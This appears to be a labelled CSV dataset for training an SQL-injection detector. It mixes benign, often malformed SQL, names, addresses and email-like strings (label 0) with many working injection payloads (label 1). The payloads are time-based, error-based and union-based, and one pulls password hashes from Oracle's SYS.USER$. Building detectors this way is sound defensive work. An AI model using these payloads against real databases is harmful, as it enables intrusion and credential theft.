Query,Label
"1'||  (  select 'xyft' from dual where 8250  =  8250 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",1
"SELECT WEEKOFYEAR ( ""2017-01-01"" ) ;",0
"-7482%""   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,1
1525,0
SELECT * FROM seed WHERE section = 'build' FETCH FIRST 3 ROWS ONLY,0
sims2@videocasa-ebs.ru,0
"  SELECT Orders.partyrID, Employees.your, Employees.roar FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.centralID ORDER BY Orders.deadID",0
SELECT AVG ( public ) FROM gasoline,0
SELECT TOP 3 * FROM say,0
"   SELECT canal, crew+ ', ' + sent+ ' ' + log+ ', ' + bat AS needed  FROM further",0
"1""  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
fany,0
villamuera de la cueza,0
SELECT * FROM under WHERE bicycle = 'escape'  AND  ( stove = 'sides' OR hung = 'telephone' ) ,0
SELECT COUNT ( air ) FROM attempt,0
"   SELECT pond,minerals,vowel,became,blew     (  (  usual JOIN note ON important.dollar =  around.problem )   INNER JOIN shareON Orders.point =  however.motherID ) ",0
1'  )   as gxfu where 9676  =  9676,1
"  SELECT * FROM sent WHERE result NOT IN  ( 'scale', 'buried', 'basket' )  ",0
"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  4666  =  4666",1
SELECT TOP 3 * FROM kept SELECT * FROM stove 3SELECT * FROM blood,0
19243,0
SELECT * FROM summer WHERE jungle IN  ( SELECT push FROM fence ) ,0
"  SELECT * FROM directly WHERE hard NOT IN  ( 'lucky', 'bottom', 'earth' )  ",0
"-9209%""   )    )     )   union all select 3736,3736,3736--",1
1'   )    )     )   and 7533  =  7533 and    (    (     (  'hoyw'  =  'hoyw,1
"  UPDATE alike SET think =  'gather', City =  'oil' WHERE expect =  sit",0
29579903v,0
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",1
"1"" where 7631  =  7631 and 4733  =  3439",1
SELECT * FROM machinery WHERE choice = 'plan',0
SELECT weak,0
66837882c,0
"-3865'  )   union all select 4935,4935,4935,4935,4935--",1
SELECT COUNT ( thumb ) FROM elephant,0
" select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",1
nedra,0
46824,0
"1""  )   where 2657  =  2657 and 5309  =  7592--",1
"masia ca l'angel 39,",0
SELECT MIN ( large )  AS hardly FROM century,0
SELECT * FROM crew  WHERE put = problem,0
"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1
SELECT * FROM gather WHERE scared NOT LIKE 'cap%',0
"1 where 1186  =  1186 union all select null,null,null,null,null,null,null#",1
"com/?option  =  com_k2  <act>  <![CDATA[procMemberInsert]]>  </act>   <act>  <![CDATA[procMemberLogin]]>  </act>   <allow_comment>  <![CDATA[]]>  </allow_comment>   <allow_trackback>  <![CDATA[]]>  </allow_trackback>   <birthday>  <![CDATA[19850616]]>  </birthday>   <content>  <![CDATA[ <img src  =  ""http://media2",0
2.58973E+15,0
"   SELECT slipped, sister, street FROM exactly WHERE blood  IS NULL",0
"select count  (  *  )   from generate_series  (  1,5000000  )  #",1
rubio,0
"1"" where 3933  =  3933 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
SELECT * FROM farther WHERE NOT determine = 'began'  AND NOT sink = 'fully',0
DELETE FROM hit,0
SELECT meet ( s FROM avoid RIGHT JOIN,0
SELECT DISTINCT positive FROM fallen,0
august,0
pi,0
" SELECT * FROM lovely ORDER BY practice, ship",0
SELECT spell ( s ) FROM else INNER JOIN,0
"   SELECT Employees.adjective, COUNT ( Orders.oceanID )  AS guessFROM    ( OrdersINNER JOIN join ON Orders.deathID  =  Employees.snowID ) ",0
"   SELECT Employees.regular, COUNT ( Orders.mountainID )  AS flagFROM    ( OrdersINNER JOIN lips ON Orders.gladID  =  Employees.plusID ) ",0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  --",1
"-6747"" or 9323  =  9323#",1
santa mara de la vega,0
SELECT * FROM simple,0
SELECT COUNT ( DISTINCT complete )  FROM wish,0
"1'||  (  select 'jrbp' from dual where 4129  =  4129 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
claudio iturrieta,0
qui0g6n16si2o,0
"1  )   as zelk where 1944  =  1944 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"   SELECT mistake, clock, neededFROM burst WHERE play  IS NOT NULL",0
"iif  (  9007  =  3836,1,1/0  )  ",1
SELECT COUNT ( share ) FROM apple,0
"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'ifca' like 'ifca",1
poblacin de arroyo,0
91309762s,0
5106,0
SELECT * FROM pan,0
chekhov@biosaludsystems.gov,0
"iif  (  5519  =  4796,1,1/0  )  ",1
1%'  )   and 8734  =  5844,1
cabal urrupan,0
32727347a,0
"pl. quintero baez, 137",0
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1
SELECT * FROM tales WHERE mark = 'curious'  OR out = 'damage',0
moneder-a,0
"  SELECT taughtID AS ID, discovery AS steady FROM mainly",0
gino,0
7.01035E+15,0
SELECT include ( s )  FROM egg FULL OUTER JOIN,0
"iif  (  1718  =  5436,1,1/0  )  ",1
"  SELECT orID AS ID, it AS soft FROM directly",0
"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",1
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1
SELECT correctly ( s FROM cow RIGHT JOIN,0
select   (  case when   (  1354  =  7529  )   then 1354 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
8.71176E+15,0
SELECT power ( s )  FROM instant,0
1 and 2006  =  2006,1
7860,0
SELECT AVG ( rubbed ) FROM original,0
FROM  ( SELECT DISTINCT wood FROM roof ) ,0
SELECT lot ( s )  FROM escape,0
"  SELECT travel,fog FROM manner WHERE ruler = 'search' UNION SELECT bow, mud FROM easily",0
"1' where 5004  =  5004 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT * FROM in WHERE another BETWEEN '1996-07-01' AND '1996-07-31',0
1'   )    )    as gchn where 5856  =  5856,1
"   SELECT monkey, operation+ ', ' + finger+ ' ' + tool+ ', ' + speed AS built  FROM development",0
SELECT * FROM raw WHERE term = 'entirely' FETCH FIRST 3 ROWS ONLY,0
tarpey@bwds.ne,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c88946771c' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
"select * from generate_series  (  1488,1488,case when   (  1488  =  1685  )   then 1 else 0 end  )   limit 1--",1
8.04948E+15,0
1'+  (  select 'mdiu' where 4443  =  4443,1
francisc,0
6ong6,0
1'  )   where 2928  =  2928 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
anguita,0
gossett@conac.com.li,0
"  SELECT ready,original FROM roof WHERE atmosphere = 'green' UNION SELECT chose, younger FROM finish",0
"c/ corint, 13 11?a",0
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'gfll'  =  'gfll",1
SELECT everywhere ( s )  FROM western FULL OUTER JOIN,0
santa maria de corc,0
1%' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and '%'  =  ',1
SELECT * FROM now  WHERE therefore NOT LIKE '[learn]%',0
wei-tsig8,0
1'||  (  select 'homm' where 4937  =  4937 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
SELECT * FROM straw  WHERE exciting = halfway,0
SELECT COUNT ( gray )  FROM stems,0
1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,1
39202408n,0
"1'||  (  select 'odud' from dual where 2468  =  2468 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
" SELECT * FROM promised ORDER BY there, bet",0
SELECT * FROM search FETCH FIRST 3 ROWS ONLY,0
"-2612""  )   as iwfj where 3231  =  3231 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
manda,0
bugarra,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
"c/ zamora, 151, 1-b",0
"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",1
1  )   as wiyx where 6515  =  6515,1
SELECT * FROM title 3,0
-4896'  )   union all select 1929--,1
SELECT * FROM my WHERE NOT of = 'minerals'  AND NOT people = 'reader',0
"SELECT CHAR_LENGTH ( ""SQL Tutorial"" )  AS LengthOfString;",0
SELECT headed ( s )  FROM threw FULL OUTER JOIN,0
select case when 6558  =  4327 then 1 else null end--,1
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1
"pedrosas, las",0
SELECT * FROM truth WHERE said = 'five' LIMIT 3,0
SELECT TOP 3 * FROM mighty,0
frison@barnizultravioleta.jm,0
-8357'   )    )    as henk where 8198  =  8198 or 2558  =  9103#,1
"-2453""  )   union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",1
parmenia,0
"-1634%' union all select 5937,5937,5937,5937--",1
"1%""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1 where 1299  =  1299,1
FROM  ( SELECT DISTINCT old FROM cook ) ,0
2.79749E+15,0
SELECT TOP 50 PERCENT * FROM flies,0
24711,0
" SELECT column_name ( s )  FROM opposite,gravity",0
SELECT TOP 3 * FROM direction SELECT * FROM theory 3SELECT * FROM tail,0
huyente,0
6.71628E+15,0
-4363%'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  '%'  =  ',1
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
2925,0
odelsia,0
morales de toro,0
SELECT TOP 3 * FROM sleep WHERE major = 'parallel' SELECT * FROM quarter,0
SELECT COUNT ( DISTINCT him )  FROM thou,0
" select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1
SELECT * FROM father WHERE related BETWEEN have09/01/1996or AND seed15/31/1996chicken,0
43511,0
SELECT * FROM yet,0
angeles jarama,0
"   SELECT review, helpful, afternoonFROM enter WHERE poor  IS NOT NULL",0
-8301'   )    )     )   or   (  5708  =  5268  )  *5268 and    (    (     (  'hkha'  =  'hkha,1
1  )   or sleep  (  5  )   and   (  2211  =  2211,1
"1""  )   rlike sleep  (  5  )  #",1
"1%""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""%""  =  """,1
end and    (    (   6874  =  6874,1
22809,0
"1%'   )    )     )   union all select null,null,null,null#",1
thompson,0
"   SELECT force, game, island FROM helpful WHERE pine  IS NULL",0
SELECT night ( s )  FROM notice UNION,0
charlot@ringringrent.rw,0
SELECT * FROM difficult WHERE Price NOT BETWEEN 10 AND 20,0
"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
villarrasa,0
"   SELECT COUNT ( principle ) , office FROM idea BY biggest",0
"alcalde baeza medina, s/n,",0
-8463   )    )     )   or 4861  =  9834#,1
"1'  )   union all select null,null,null,null#",1
"  SELECT * FROM shaking WHERE them IN  ( 'prevent', 'coach', 'writer' )  ",0
select case when 7649  =  9297 then 1 else null end--,1
SELECT * FROM forth WHERE NOT grew = 'dry'  AND NOT why = 'plus',0
"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,1
87811832v,0
"calle dean miranda 106, 6-f",0
"paseo pinos, 147",0
"1""  )   as evoq where 8193  =  8193 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1
natal,0
SELECT * FROM over WHERE    NOT cap = 'fighting',0
SELECT * FROM triangle FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM anybody,0
6u33a,0
car,0
select   (  case when   (  4780  =  4432  )   then 4780 else 4780*  (  select 4780 from mysql.db  )   end  )  #,1
"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",1
"c/ xeixa, 189 8?d",0
SELECT * FROM congress FETCH FIRST 50 PERCENT ROWS ONLY,0
4661,0
mozek,0
"1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'akki'  =  'akki",1
"   SELECT herself,familiar,excellent,proud,volume     (  (  believed JOIN rate ON character.count =  bound.ride )   INNER JOIN clothesON Orders.valley =  throat.westernID ) ",0
SELECT * FROM range WHERE syllable = 'sides',0
-6200%'   )    )    or 8077  =  4661,1
gribov-ridgeley@creacionwebs.lk,0
1   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
SELECT AVG ( won ) FROM foreign,0
SELECT third ( s )  FROM about FULL OUTER JOIN,0
SELECT * FROM rhyme WHERE sink IN  ( SELECT furniture FROM our ) ,0
 )   or pg_sleep  (  __TIME__  )  --,1
celadas,0
b82r8l23o,0
SELECT AVG ( gradually ) FROM such SELECT SUM ( meat ) ,0
SELECT * FROM dirt FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT AVG ( salt ) FROM personal SELECT SUM ( hit ) ,0
" SELECT * FROM mirror ORDER BY too ASC, particularly DESC",0
-9264'  )   or 8571  =  8571--,1
" select * from users where id  =  1 or ""_{"" or 1  =  1 -- 1",1
select   (  case when   (  7594  =  8086  )   then 7594 else 1/  (  select 0  )   end  )  --,1
SELECT COUNT ( spoken )  FROM explanation,0
SELECT earn ( s )  FROM close,0
SELECT * FROM equally WHERE fur NOT LIKE 'were%',0
dcada,0
SELECT * FROM tribe ORDER BY river,0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c839e379ee' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
"1'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
melucci,0
serret@sierradealcaraz.dj,0
techumbre,0
saya,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",1
hays_adiarte@lingotes.com.je,0
"   SELECT Employees.carbon, COUNT ( Orders.viewID )  AS dugFROM    ( OrdersINNER JOIN constantly ON Orders.islandID  =  Employees.blockID ) ",0
"1""  )   where 5828  =  5828 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM  ( SELECT machine FROM combine ) ,0
7361,0
"1%' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
zelda_hjelm5@silver-knights.it,0
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1
zonc4o,0
SELECT * FROM understanding FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM during,0
SELECT * FROM sun WHERE that = 'window' LIMIT 3,0
SELECT above ( s FROM beauty RIGHT JOIN,0
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
SELECT gravity ( s )  FROM please SELECT establish FROM letter,0
"1'   )    )     )   and make_set  (  6094  =  2929,2929  )   and    (    (     (  'gkyo'  =  'gkyo",1
"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""qkds"" like ""qkds",1
"   SELECT mouth, swimming, herself FROM dangerous WHERE leaving  IS NULL",0
1   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  2197  =  2197,1
SELECT * FROM hello,0
if  (  7340  =  9813  )   select 7340 else drop function yppp--,1
